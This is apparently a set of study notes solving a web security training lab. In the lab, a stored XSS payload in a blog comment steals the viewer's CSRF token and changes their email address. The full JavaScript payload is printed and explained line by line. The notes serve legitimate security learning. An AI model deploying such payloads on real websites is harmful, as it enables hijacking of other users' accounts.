This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`  
<br/>**1- Notice there is a CSRF token and a parameter email when changing the email in your account**  
![000ec79bc6c02c8c9fb58e52b6fb7eb2.png](../_resources/000ec79bc6c02c8c9fb58e52b6fb7eb2.png)  
<br/>**2- We are going to leave our stored XSS payload in the comment box**  
![fec93809cad5c33ee6e941d150685a7b.png](../_resources/fec93809cad5c33ee6e941d150685a7b.png)  
<br/>**3- This is the payload, with it we are going to steal the csrf token from other user that visits the page**  
<br/>`<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>`  
<br/>**4- What the payload does:**  
<br/>Here’s what that payload is doing, line by line, and why it works in the Burp lab.

`<script>var req = new XMLHttpRequest();req.onload = handleResponse;req.open('get','/my-account',true);req.send();`

- A **stored XSS** executes this JS in the victim’s browser.
    
- It creates an XHR (`req`) to **GET `/my-account`** (same origin as the blog).
    
- Because it’s same-origin, the browser **automatically sends the victim’s cookies** (session, etc.) and **lets the script read the HTML response**.
    
- `onload` calls `handleResponse` after the page returns.
    

  
<br/>

`function handleResponse() {`  
    `    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];`  
`this.responseText is the full HTML of /my-account.`

It uses a regex to find a CSRF token sitting in a hidden input:

- name="csrf" value="(\\w+)" captures the token into group 1.

&nbsp;\\w+ matches letters/digits/underscore; works for many tokens (e.g., hex). If the token contained - or = etc., this would fail.  
<br/><br/>`var changeReq = new XMLHttpRequest();`  
    `    changeReq.open('post', '/my-account/change-email', true);`  
    `    changeReq.send('csrf='+token+'&email=test@test.com')`  
`};`  
`</script>`  
With the token in hand, it builds a second request that performs a state-changing action (change email).

- It replays the CSRF token in the POST body so server-side CSRF defenses pass.
- Cookies again go automatically, so the action is done as the victim.

&nbsp;